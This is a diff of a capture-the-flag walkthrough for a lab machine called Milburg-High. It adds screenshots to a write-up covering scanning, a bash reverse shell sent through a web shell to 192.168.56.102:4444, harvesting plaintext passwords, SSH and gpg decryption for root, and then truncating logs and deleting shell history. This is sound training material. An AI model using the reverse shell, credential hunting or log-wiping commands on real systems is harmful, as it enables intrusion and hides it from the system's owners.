@@ -14,6 +14,8 @@ To identify the target's IP address on the local virtual network, I performed an
 ```bash
 sudo netdiscover -r 192.168.56.0/24
 ```
+<img width="639" height="178" alt="sudo netdiscover -r 192 168 56 024" src="https://github.com/user-attachments/assets/a91f8b89-2b59-4a67-af7e-f9c48c4edd92" />
+
 
 -r: Specifies the range to scan in CIDR notation.
 
@@ -26,6 +28,8 @@ I used nmap to identify open ports, service versions, and run default scripts. C
 ```bash
 sudo nmap -sC -sV -p- -T4 192.168.56.103
 ```
+<img width="767" height="377" alt="sudo nmap -sC -sV -p- -T4 192 168 56 103" src="https://github.com/user-attachments/assets/1ea1db9f-4c47-48f8-846c-21214d4b242c" />
+
 
 ## Flag Breakdown :
 
@@ -70,6 +74,8 @@ I sent a Bash reverse shell payload through the vulnerable web shell input:
 ```
 bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'
 ```
+<img width="1918" height="967" alt="bash -c &#39;bash -i   devtcp192 168 56 1024444 0 1&#39;" src="https://github.com/user-attachments/assets/1bd7314f-f688-4f67-bf44-559c0b167877" />
+
     
 **Result**: Initial access gained as the service account **`www-data`**.
 
@@ -83,9 +89,16 @@ I searched the system for sensitive files and identified a hidden password store
 ```Bash
 www-data@Milburg-High:/var/www/html$ find / -name "*password*" -type f 2>/dev/null
 ```
+<img width="659" height="807" alt="www-data@Milburg-Highvarwwwhtml$ find  -name password -type f 2devnull 1" src="https://github.com/user-attachments/assets/fe6f61d7-98b8-443f-8f36-66f2d70e1c14" />
+
+<img width="511" height="798" alt="www-data@Milburg-Highvarwwwhtml$ find  -name password -type f 2devnull 2" src="https://github.com/user-attachments/assets/884633ea-413c-4a92-80e0-81e16aec68a5" />
+
+
 ```Bash
 www-data@Milburg-High:/var/www/html$ cat /home/bob/.old_passwordfile.html
 ```
+<img width="513" height="119" alt="www-data@Milburg-Highvarwwwhtml$ cat homebob old_passwordfile html" src="https://github.com/user-attachments/assets/b91ec707-bd57-4023-a9c7-0d41cf7b1cbe" />
+
 
 Findings:
 • Located /home/bob/.old_passwordfile.html, which contained credentials for jc (Qwerty) and seb (T1tanium_Pa$$word_Hack3rs_Fear_M3).
@@ -97,6 +110,8 @@ I harvested credentials from a hidden file at /home/bob/.old_passwordfile.html. 
 ```bash
 ssh seb@192.168.56.103 -p 25468
 ```
+<img width="502" height="261" alt="ssh seb@192 168 56 103 -p 25468" src="https://github.com/user-attachments/assets/f20239e5-7ddf-43c8-a828-d561961fa5b6" />
+
 
 • seb password : T1tanium_Pa$$word_Hack3rs_Fear_M3
 
@@ -123,6 +138,8 @@ jc@Milburg-High:/home/elliot$ ls
 Desktop  Documents  Downloads  Music  Pictures  Templates  theadminisdumb.txt  Videos
 jc@Milburg-High:/home/elliot$ cat theadminisdumb.txt
 ```
+<img width="1902" height="143" alt="cat password for elliot" src="https://github.com/user-attachments/assets/622516f4-4df6-457d-9d90-bfcd07bc4f83" />
+
 
 I also found Elliot's password (theadminisdumb) in /home/elliot/theadminisdumb.txt.  
 
@@ -133,6 +150,8 @@ jc@Milburg-High:/home/elliot$ ls -laR /home/bob /home/elliot 2>/dev/null
 After run this command, it will spit out 156 files in `/home/bob` and `/home/elliot`. File `notes.sh` was found.
 
 `notes.sh` file location : `/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_lookie_In_Here`
+<img width="400" height="67" alt="notes sh" src="https://github.com/user-attachments/assets/81f33722-11dd-468e-909b-eb0183d1d399" />
+
 
 ```bash
 jc@Milburg-High:/home/elliot$ cd /home
@@ -149,6 +168,8 @@ notes.sh
 ```bash
 cat notes.sh
 ```
+<img width="958" height="298" alt="cat notes sh" src="https://github.com/user-attachments/assets/65364e00-7f2a-4f68-81f7-211ebb6d5c91" />
+
 
 acrostic passphrase HARPOCRATES was found inside `notes.sh`
 
@@ -167,6 +188,9 @@ It was used to uncover hidden files, scripts, and sensitive documentation buried
 Next I discover `login.txt.gpg` in `/home/bob/Documents` but when i try to read this file by using cat it only show raw, binary data of an encrypted file.
 
 When you use the cat command on a .gpg file, you are telling the terminal to display its contents as plain text. However, because the file is encrypted, the data consists of binary characters that the terminal cannot translate into readable letters, resulting in the "gibberish" or symbols
+<img width="1504" height="204" alt="cat login txt gpg" src="https://github.com/user-attachments/assets/037bb9ad-e6b6-413e-ab97-21b8a32046cc" />
+
+
 
 ## Vertical Escalation (Root)
 
@@ -178,6 +202,9 @@ Decryption: I used this passphrase to decrypt Bob's password vault.
 ```Bash
 gpg --batch --passphrase HARPOCRATES -d /home/bob/Documents/login.txt.gpg
 ```
+<img width="1002" height="83" alt="gpg --batch --passphrase HARPOCRATES -d homebobDocumentslogin txt gpg" src="https://github.com/user-attachments/assets/11558bad-aa4c-4da8-8c46-4fbc195816db" />
+
+
 Result: Decrypted Bob's password: b0bcat_.  
 
 Root Shell:
@@ -189,6 +216,9 @@ Password : b0bcat_
 ```Bash
 sudo -i
 ```
+<img width="644" height="101" alt="enter root" src="https://github.com/user-attachments/assets/c8fcca49-28c6-457d-a902-64ef86926012" />
+
+
 ## Flag Breakdown :
 
 • -i: Simulates a login to provide the root environment.  
@@ -197,6 +227,8 @@ sudo -i
 root@Milbirg-High:`# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+<img width="448" height="41" alt="root id" src="https://github.com/user-attachments/assets/1f6dbe43-5e4a-4bf9-be68-ce7fcf0b1230" />
+
 
 Seeing uid=0(root) gid=0(root) groups=0(root) is the "holy grail" for a penetration tester. 
 
@@ -225,6 +257,8 @@ It signifies that you have successfully achieved Full System Compromise and are 
 root@Milbirg-High:`# cat flag.txt
 hey n there flag.txt
 ```
+<img width="378" height="39" alt="cat flag txt" src="https://github.com/user-attachments/assets/88de6f42-0de7-45ac-9523-a9f446272e69" />
+
 
 Flag: Captured flag.txt in the /root directory.  
 
@@ -244,17 +278,22 @@ Persistence is achieved via the non-standard SSH service (Port 25468) using the 
 
 To remove forensic evidence of the intrusion, I sanitized the system logs and command history.
 
-# Clear command history
-```Bash
-history -c && rm /root/.bash_history
-```
-
 # Truncate system logs
 ```Bash
 truncate -s 0 /var/log/auth.log
 truncate -s 0 /var/log/apache2/access.log
 truncate -s 0 /var/log/apache2/error.log
 ```
+<img width="579" height="184" alt="truncate" src="https://github.com/user-attachments/assets/549929d8-3b13-4a70-9378-3da03a8acf61" />
+
+
+# Clear command history
+```Bash
+history -c && rm /root/.bash_history
+```
+<img width="581" height="56" alt="history" src="https://github.com/user-attachments/assets/9af25f8e-8e13-406f-8b2c-453c6112db0e" />
+
+
 ## Flag Breakdown :
 
 history -c: Clears the current session's history buffer.  
